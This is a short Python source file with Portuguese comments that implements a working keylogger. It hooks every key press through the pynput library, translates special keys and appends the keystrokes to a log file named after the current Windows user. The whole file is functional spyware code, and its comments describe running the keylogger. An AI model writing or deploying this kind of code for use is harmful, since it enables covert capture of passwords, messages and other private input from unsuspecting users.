import os
import getpass
from pynput.keyboard import Listener

usuario = getpass.getuser()
log = 'C:/Users/'+usuario+'/'+usuario+'.log'

def escreva(letra):
	
	traduzir = {

		'Key.space': " ",
		'Key.shift': ' ',
		'Key.enter': '\n',
		'Key.alt': '',
		'Key.esc': '',
		'Key.cmd': '',
		'Key.caps_lock': '',
		'Key.backspace': '',
		'Key.ctrl_l': 'ctrl+',
		'Key.ctrl_r': 'ctrl+',
	}

	# Aqui vamos converter as letras para strings
	escrita = str(letra)
	
	escrita = escrita.replace("'", "")
	
	# Aqui aplica o tradutor
	for letra in traduzir:
		escrita = escrita.replace(letra, traduzir[letra])

	with open(log, 'a') as n:
		n.write(escrita)

# E esse roda o keylogger
with Listener(on_press=escreva) as x:
	x.join()

	# Vamos testar
